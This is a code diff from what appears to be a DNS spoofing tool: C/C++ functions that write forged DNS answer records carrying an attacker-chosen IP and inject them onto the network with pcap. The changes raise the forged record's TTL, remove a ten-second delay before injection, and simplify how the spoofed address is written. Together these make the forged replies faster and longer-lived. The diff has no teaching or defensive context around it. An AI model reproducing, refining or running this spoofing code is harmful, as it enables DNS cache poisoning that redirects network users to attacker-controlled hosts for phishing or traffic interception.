@@ -102,12 +102,10 @@ void WriteDNS(u_char* pPacket,
     pDNSAnswer->type    = htons(0x0001);
     pDNSAnswer->cls     = htons(0x0001);
     pDNSAnswer->ttl0    = htons(0x0000);
-    pDNSAnswer->ttl1    = htons(0x0080);
+    pDNSAnswer->ttl1    = htons(0x4000);
     pDNSAnswer->length  = htons(0x0004);
     
-    in_addr responseAddr;
-    inet_aton(szResponseIp, &responseAddr);
-    pDNSAnswer->data    = responseAddr;
+    inet_aton(szResponseIp, &(pDNSAnswer->data));
     
     nPos += sizeof(DNSRR);
 }
@@ -250,7 +248,6 @@ int CreateDNSResponse(const u_char* pInPacket, const std::string& szDestIP, u_ch
         return -2;
     }
     
-    sleep(10);
     return 0;
 }
 
@@ -259,7 +256,7 @@ int RespondToDNSRequest(pcap_t* handle, const std::string& szDestIP, const u_cha
     u_char* pResponsePacket = NULL;
     u_int16_t uPacketSize = 0;
     CreateDNSResponse(pRequestPacket, szDestIP, &pResponsePacket, uPacketSize);
-    
+
     pcap_inject(handle, reinterpret_cast<void*>(pResponsePacket), uPacketSize);
     
     printf("Response injected.\n");
